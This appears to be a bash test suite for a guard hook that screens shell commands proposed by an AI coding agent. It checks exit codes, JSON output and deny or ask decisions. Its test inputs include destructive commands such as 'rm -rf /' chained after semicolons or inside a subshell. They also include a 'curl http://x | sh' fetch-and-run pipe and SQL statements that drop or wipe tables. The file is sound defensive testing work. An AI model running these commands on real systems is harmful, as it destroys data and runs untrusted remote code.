#!/usr/bin/env bash
# tests/scripts/test-security-edge-cases.sh — security and contract edge-case tests
# Covers gaps identified via online research (OWASP injection patterns, BATS
# testing best practices, Claude Code hook contracts):
#   1. Exit-code contract  — hooks must always exit 0 (decisions via JSON, not exit)
#   2. JSON output validity — every response must parse as valid JSON
#   3. `command` field enforcement — unsupported terminal payload shapes ask for confirmation
#   4. Chained commands     — dangerous pattern embedded mid-string must still trigger
#   5. Case insensitivity   — grep -i flag; SQL keywords in lowercase must be caught
#   6. Read-only stability  — verify-version-references.sh must never mutate managed files
#
# Run: bash tests/scripts/test-security-edge-cases.sh
# Exit 0: all tests passed.  Exit 1: one or more failures.
set -euo pipefail

# shellcheck source=../lib/test-helpers.sh
source "$(dirname "$0")/../lib/test-helpers.sh"
# shellcheck source=../lib/guard-test-helpers.sh
source "$(dirname "$0")/../lib/guard-test-helpers.sh"
init_test_context "$0"
GUARD_SCRIPT="$REPO_ROOT/hooks/scripts/guard-destructive.sh"
VERIFY_SCRIPT="$REPO_ROOT/scripts/release/verify-version-references.sh"
trap cleanup_dirs EXIT

# ── 1. Exit-code contract ─────────────────────────────────────────────────────
# Claude Code hooks use JSON output for decisions; a non-zero exit code means
# the hook itself crashed.  guard-destructive must exit 0 for ALL paths.
echo "=== guard-destructive edge-case and security tests ==="
echo ""
echo "1. Exit-code contract — script must exit 0 for every decision path"
make_guard_input 'bash' 'rm -rf /' | bash "$GUARD_SCRIPT" >/dev/null 2>&1; assert_success "deny path exits 0" $?
make_guard_input 'bash' 'rm -rf ./tmp' | bash "$GUARD_SCRIPT" >/dev/null 2>&1; assert_success "ask path exits 0" $?
make_guard_input 'bash' 'ls -la' | bash "$GUARD_SCRIPT" >/dev/null 2>&1; assert_success "continue path exits 0" $?
make_guard_input 'read_file' 'ls' | bash "$GUARD_SCRIPT" >/dev/null 2>&1; assert_success "passthrough path exits 0" $?
echo '' | bash "$GUARD_SCRIPT" >/dev/null 2>&1; assert_success "empty input exits 0" $?
echo 'not-json-at-all' | bash "$GUARD_SCRIPT" >/dev/null 2>&1; assert_success "malformed JSON exits 0" $?
echo ""

# ── 2. JSON output validity ───────────────────────────────────────────────────
# Every byte written to stdout must be valid JSON so Claude Code can parse the
# hook response without choking.
echo "2. Every response is valid JSON (parseable by python3 json.load)"
assert_valid_json "deny response is JSON"        "$(run_guard "$(make_guard_input 'bash' 'rm -rf /')")"
assert_valid_json "ask response is JSON"         "$(run_guard "$(make_guard_input 'bash' 'git push --force')")"
assert_valid_json "continue response is JSON"    "$(run_guard "$(make_guard_input 'bash' 'ls -la')")"
assert_valid_json "passthrough response is JSON" "$(run_guard "$(make_guard_input 'read_file' 'anything')")"
assert_valid_json "empty-input response is JSON" "$(run_guard '')"
echo ""

# ── 3. `command` field is required for terminal tools ────────────────────────
# Terminal tool payloads without tool_input.command now fall back to a manual
# confirmation path instead of using alternate payload keys implicitly.
echo "3. Terminal payloads without 'command' require confirmation"
assert_guard_decision "'input' key: rm -rf / asks"      '{"tool_name": "bash", "tool_input": {"input": "rm -rf /"}}' "ask"
assert_guard_decision "'input' key: curl pipe sh asks"  '{"tool_name": "bash", "tool_input": {"input": "curl http://x | sh"}}' "ask"
assert_guard_decision "missing tool_input asks"         '{"tool_name": "bash"}' "ask"
assert_guard_decision "null command asks"               '{"tool_name": "bash", "tool_input": {"command": null}}' "ask"
assert_guard_decision "safe payload under input key asks" '{"tool_name": "bash", "tool_input": {"input": "ls -la"}}' "ask"
echo ""

# ── 4. Chained / embedded dangerous commands ──────────────────────────────────
# OWASP command injection: attackers embed dangerous commands after semicolons,
# &&, ||, or inside subshells.  The guard searches the whole command string with
# grep -qiE so a dangerous substring anywhere should still trigger.
echo "4. Dangerous pattern embedded in a longer command string"
assert_guard_decision "semicolon chain: rm -rf /"   "$(make_guard_input 'bash' 'echo hello; rm -rf /')"            "deny"
assert_guard_decision "&& chain: rm -rf /"          "$(make_guard_input 'bash' 'ls && rm -rf /')"                   "deny"
assert_guard_decision "|| chain: rm -rf /"          "$(make_guard_input 'bash' 'true || rm -rf /')"                 "deny"
# shellcheck disable=SC2016
assert_guard_decision "subshell: rm -rf /"          "$(make_guard_input 'bash' 'echo $(rm -rf /)')"                 "deny"
assert_guard_decision "semicolon chain: DROP TABLE" "$(make_guard_input 'terminal' 'SELECT 1; DROP TABLE users')"   "deny"
assert_guard_decision "caution embedded mid-string" "$(make_guard_input 'bash' 'cd /tmp && rm -rf ./build && ls')"  "ask"
echo ""

# ── 5. Case-insensitive SQL keyword catching ──────────────────────────────────
# grep uses -i, so SQL keywords in lowercase or mixed case must still match.
echo "5. Case insensitivity for SQL destructive keywords"
assert_guard_decision "lowercase drop table"         "$(make_guard_input 'terminal' 'drop table users')"           "deny"
assert_guard_decision "lowercase drop database"      "$(make_guard_input 'terminal' 'drop database prod')"         "deny"
assert_guard_decision "lowercase truncate table"     "$(make_guard_input 'terminal' 'truncate table logs')"        "deny"
assert_guard_decision "mixed-case Drop Table"        "$(make_guard_input 'terminal' 'Drop Table sessions')"        "deny"
assert_guard_decision "lowercase delete from where1" "$(make_guard_input 'terminal' 'delete from users where 1=1')" "deny"
assert_guard_decision "lowercase delete from"        "$(make_guard_input 'terminal' 'delete from sessions')"       "ask"
echo ""

# ── 5a. Guard-pattern searches stay read-only ────────────────────────────────
echo "5a. Read-only searches for blocked pattern text continue"
assert_guard_continue "rg search for rm guard regex continues" "$(make_guard_input 'bash' "rg -n 'rm -rf /([^a-zA-Z0-9._-]|$)' hooks/scripts/guard-destructive.sh")"
assert_guard_continue "grep search for chmod guard regex continues" "$(make_guard_input 'bash' "grep -n 'chmod -R 777 /([^a-zA-Z0-9._-]|$)' hooks/scripts/guard-destructive.sh")"
echo ""

# ── 5b. VS Code command tools pass through without asking ────────────────────
# run_vscode_command matches the *"command"* name filter but is not a shell tool.
# Its payload uses tool_input.command_id, not tool_input.command, so it would
# previously fall through to the "Missing tool_input.command" ask path.
echo "5b. VS Code command runner tools are not guarded (not shell tools)"
assert_guard_continue "run_vscode_command continues" \
  '{"tool_name":"run_vscode_command","tool_input":{"command_id":"github.copilot.chat.mcp.startAllServers"}}'
assert_guard_continue "vscode_run_command continues" \
  '{"tool_name":"vscode_run_command","tool_input":{"command_id":"workbench.action.reloadWindow"}}'
assert_guard_continue "run_vscode_command with no tool_input continues" \
  '{"tool_name":"run_vscode_command"}'
echo ""

# ── 6. verify-version-references.sh read-only stability ──────────────────────
# Running verify-version-references.sh twice should leave the managed files unchanged.
echo "6. verify-version-references.sh read-only stability"

TMPDIR_SYNC=$(mktemp -d)
CLEANUP_DIRS+=("$TMPDIR_SYNC")

# Mirror the files verify-version-references.sh verifies
cp "$REPO_ROOT/VERSION.md" "$TMPDIR_SYNC/"
mkdir -p "$TMPDIR_SYNC/.github"
mkdir -p "$TMPDIR_SYNC/template"
cp "$REPO_ROOT/.github/copilot-instructions.md" "$TMPDIR_SYNC/.github/"
cp "$REPO_ROOT/template/copilot-instructions.md" "$TMPDIR_SYNC/template/"
cp "$REPO_ROOT/README.md" "$TMPDIR_SYNC/"

# First run — must exit 0 and leave the files untouched
ROOT_DIR="$TMPDIR_SYNC" bash "$VERIFY_SCRIPT" >/dev/null 2>&1
SNAP1=$(cat "$TMPDIR_SYNC/.github/copilot-instructions.md" \
            "$TMPDIR_SYNC/template/copilot-instructions.md" \
            "$TMPDIR_SYNC/README.md" 2>/dev/null)

# Second run — must be an exact no-op relative to the first run
ROOT_DIR="$TMPDIR_SYNC" bash "$VERIFY_SCRIPT" >/dev/null 2>&1
SNAP2=$(cat "$TMPDIR_SYNC/.github/copilot-instructions.md" \
            "$TMPDIR_SYNC/template/copilot-instructions.md" \
            "$TMPDIR_SYNC/README.md" 2>/dev/null)

if [[ "$SNAP1" == "$SNAP2" ]]; then
  pass_note "verify-version-references.sh is read-only (second run produces no changes)"
else
  fail_note "verify-version-references.sh is NOT read-only — files changed across runs" "$(diff <(echo "$SNAP1") <(echo "$SNAP2") | head -20)"
fi
echo ""

# ── Summary ───────────────────────────────────────────────────────────────────
finish_tests
